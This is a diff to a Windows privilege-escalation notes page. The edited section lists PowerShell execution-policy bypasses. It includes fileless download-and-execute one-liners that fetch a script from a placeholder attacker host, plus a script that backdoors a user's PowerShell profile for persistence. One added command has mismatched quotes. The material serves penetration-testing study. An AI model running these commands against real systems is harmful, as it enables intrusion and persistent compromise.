@@ -10,53 +10,72 @@ Always ensure you have **explicit** permission to access any computer system **b
 
 ### PowerShell Script Execution Policy Bypass Methods
 
-| Bypass Method                                                                                                                                                                                                  | Description                                                                                                                                                                                                             |
-| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `Set-Executionpolicy unrestricted`                                                                                                                                                                             | Administrator rights are required.                                                                                                                                                                                      |
-| `Set-ExecutionPolicy -Scope CurrentUser Unrestricted`                                                                                                                                                          | Only works in the context of the current user, but requires no Administrator rights.                                                                                                                                    |
-| <ol><li>Open .ps1 file in text editor.</li><li>Copy all text in the file</li><li>Paste into PowerShell</li></ol>                                                                                               | PowerShell will run each line of the script one at a time, essentially the same as running the script.                                                                                                                  |
-| `function <name> { <code_here> }`                                                                                                                                                                              | Similar to the above example, however you paste your code inside the curly braces, and run the code by typing the `<name>` of your function. Allows for **code reuse without having to copy and paste multiple times.** |
-| `cat $script \| IEX`                                                                                                                                                                                           | Pipes the content of the script to the `Invoke-Expression` cmdlet, which runs any specified string as a command and returns the results to the console. `IEX` is an alias for `Invoke-Expression`.                      |
-| `IEX { <code_here> }`                                                                                                                                                                                          | Essentially creates a one-time use function from your code.                                                                                                                                                             |
-| `& { <code_here> }`                                                                                                                                                                                            | The operator (`&`) is an alias for `Invoke-Expression` and is equivalent to the example above.                                                                                                                          |
-| `. { <code_here> }`                                                                                                                                                                                            | The operator (`.`) can be used to create an anonymous one-time function. This can sometimes be used to bypass certain constrained language modes.                                                                       |
-| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p>&#x3C;code>&#x3C;/code></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile and text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                      |
-| `Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) \| PowerShell -NoProfile -`                                                                                                 | Download script from attacker's machine, then run in PowerShell, in memory. No files are written to disk.                                                                                                               |
+| Bypass Method                                                                                                                                                                           | Description                                                                                                                                                                                                              |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `Set-Executionpolicy Bypass`                                                                                                                                                            | Administrator rights are required.                                                                                                                                                                                       |
+| `Set-ExecutionPolicy -Scope CurrentUser Bypass`                                                                                                                                         | Only works in the context of the current user but requires no Administrator rights.                                                                                                                                      |
+| <ol><li>Open .ps1 file in text editor.</li><li>Copy all text in the file</li><li>Paste into PowerShell</li></ol>                                                                        | PowerShell will run each line of the script one at a time, essentially the same as running the script.                                                                                                                   |
+| `Echo <script_code> \| PowerShell.exe -noprofile -`                                                                                                                                     | Similar to simply pasting the code.                                                                                                                                                                                      |
+| `cat $script.ps1 \| PowerShell.exe -noprofile -`                                                                                                                                        | Effectively the same as the previous example, but the code is read from a script file instead of being pasted. `cat` is an alias for `Get-Content`.                                                                      |
+| `function <name> { <code_here> }`                                                                                                                                                       | Similar to the above examples, however you paste your code inside the curly braces, and run the code by typing the `<name>` of your function. Allows for **code reuse without having to copy and paste multiple times.** |
+| `PowerShell.exe -command "<code_here>"`                                                                                                                                                 | Runs the string provided to the `-c` (Command) argument as code.                                                                                                                                                         |
+| `cat $script.ps1 \| IEX`                                                                                                                                                                | Pipes the content of the script to the `Invoke-Expression` cmdlet, which runs any specified string as a command and returns the results to the console. `IEX` is an alias for `Invoke-Expression`.                       |
+| `IEX { <code_here> }`                                                                                                                                                                   | Essentially creates a one-time use function from your code.                                                                                                                                                              |
+| `& { <code_here> }`                                                                                                                                                                     | The operator (`&`) is an alias for `Invoke-Expression` and is equivalent to the example above.                                                                                                                           |
+| `. { <code_here> }`                                                                                                                                                                     | The operator (`.`) can be used to create an anonymous one-time function. This can sometimes be used to bypass certain constrained language modes.                                                                        |
+| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile and text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                       |
+| `Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) \| PowerShell -NoProfile -`                                                                          | Download script from attacker's machine, then run in PowerShell, in memory. No files are written to disk.                                                                                                                |
 
 #### Other Bypass Methods
 
 **Execute .ps1 scripts on compromised machine: in memory and other bypass methods**
 
-If your are able to use `Invoke-Expresion` (`IEX`) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
+If you are able to use `Invoke-Expression` (`IEX`) you can execute remote scripts using the following command. You can also copy and paste the functions into your PowerShell session, so any functions become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory.
 
 ```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
 ```
 
-`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.
+This can also be done from a .bat script by calling `powershell.exe`.
+
+```shell
+powershell.exe -nop -c "IEX (New-Object -TypeName Net.WebClient).downloadString('http://$attacker_ip/$script.ps1")'
+```
+
+`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as EDR. Downloading files to a target's machine is not always allowed in a penetration test, so another method to use is `Invoke-Command`. This can be done using the following format.
 
 ```powershell
 Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (Get-Credential)
 ```
 
-This will execute the file and it's contents on the remote computer.
+This will execute the file and its contents on the remote computer.
 
-Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
+Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.  The example script below can do this.
 
 ```powershell
 Write-Verbose "Creates powershell profile for user"
 New-Item -Path $PROFILE -ItemType File -Force
-#
-# The $PROFILE VARIABLE IS EITHER GOING TO BE
-#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
-# OR
-#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
-#
-# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
+<#
+The $PROFILE vaiable will be either:
+    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+OR
+    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+depending on whether OneDrive is in use or not.
+#>
+<#
+Running scripts in the PowerShell profile will import all of the commands 
+everytime the backdoored user opens a PowerShell session. This means you will 
+need to open a new powershell session after doing this in order to access 
+the commands. I assume this can be done by just executing the "powershell" 
+command though you may need to have a new window opened or new reverse/bind 
+shell opened. You can also just reload the profile
+#>
+
 cmd /c 'copy \\$attacker_ip>\$script.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
 
 powershell.exe
-# If that does not work try reloading the user profile.
+
+# If this does not work try reloading the user profile.
 & $PROFILE
 ```
 
@@ -694,6 +713,7 @@ use exploit/windows/local/always_install_elevated
 ### References
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
+* [https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
 * [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 * [https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools](https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools)
 * [https://adamtheautomator.com/powershell-get-registry-value/](https://adamtheautomator.com/powershell-get-registry-value/)
